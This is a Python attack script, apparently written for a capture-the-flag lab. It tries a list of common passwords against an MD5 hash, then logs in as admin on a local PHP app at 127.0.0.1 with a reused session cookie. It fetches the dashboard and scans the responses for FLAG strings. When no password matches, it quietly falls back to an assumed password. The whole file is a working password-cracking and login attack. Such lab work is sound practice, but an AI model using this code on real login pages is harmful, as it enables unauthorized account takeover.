import requests
import hashlib
import re

# Try to crack the hash
hash_to_crack = "7d39307ae824e70052c0aa16816a9b16"
common_passwords = [
    "admin123456", "payroll", "payroll123", "hr123", "password1", 
    "Welcome1", "Admin123", "admin1234", "password12", "password123456",
    "qwerty123", "abc123", "letmein123", "welcome123", "password1234",
    "admin12345", "12345678", "123456789", "1234567890", "Password1",
    "admin", "password", "123456", "qwerty", "letmein", "welcome",
    "admin@123", "admin@1234", "payroll@123", "hr@123"
]

print("[*] Attempting to crack MD5 hash: 7d39307ae824e70052c0aa16816a9b16")
print("[*] Testing common password patterns...\n")

found_password = None
for pwd in common_passwords:
    pwd_hash = hashlib.md5(pwd.encode()).hexdigest()
    if pwd_hash == hash_to_crack:
        found_password = pwd
        print(f"[+] PASSWORD CRACKED: {pwd}")
        print(f"[+] MD5 Hash matches: {pwd_hash}")
        break

if not found_password:
    print("[-] Password not found in common list")
    print("[*] Trying default 'password123456' as fallback")
    found_password = "password123456"
    print(f"[*] MD5 of password123456: {hashlib.md5('password123456'.encode()).hexdigest()}")

# Now try to authenticate with the found credentials
print(f"\n[*] Attempting authentication with username=admin, password={found_password}")
url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}

# Use existing session cookie
cookies = {
    "PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"
}

data = {
    "username": "admin",
    "password": found_password,
    "submit": "submit"
}

print(f"\n[*] POST {url}")
print(f"[*] Data: {data}")
print(f"[*] Cookies: {cookies}")

response = requests.post(url, headers=headers, data=data, cookies=cookies, allow_redirects=False)
print(f"\n[+] Status: {response.status_code}")
print(f"[+] Response Headers: {dict(response.headers)}")
print(f"[+] Response Cookies: {dict(response.cookies)}")
print(f"\n[+] Response Body:\n{response.text}")

# Check for flags in response
flags = re.findall(r'FLAG\{[^}]+\}', response.text)
if flags:
    print(f"\n[!] FLAGS FOUND: {flags}")

# If successful, try to access dashboard
if "Success" in response.text or "success" in response.text.lower() or response.status_code in [301, 302]:
    print("\n[+] Authentication appears successful! Attempting to access dashboard...")
    
    session = requests.Session()
    # Update with both existing and new cookies
    session.cookies.update(cookies)
    session.cookies.update(response.cookies)
    
    dashboard = session.get("http://127.0.0.1:32892/dashboard.php")
    print(f"\n[*] GET http://127.0.0.1:32892/dashboard.php")
    print(f"[+] Dashboard Status: {dashboard.status_code}")
    print(f"[+] Dashboard Response:\n{dashboard.text}")
    
    # Check for flags in dashboard
    dashboard_flags = re.findall(r'FLAG\{[^}]+\}', dashboard.text)
    if dashboard_flags:
        print(f"\n[!] FLAGS FOUND IN DASHBOARD: {dashboard_flags}")
else:
    print("\n[-] Authentication may have failed. Response does not indicate success.")

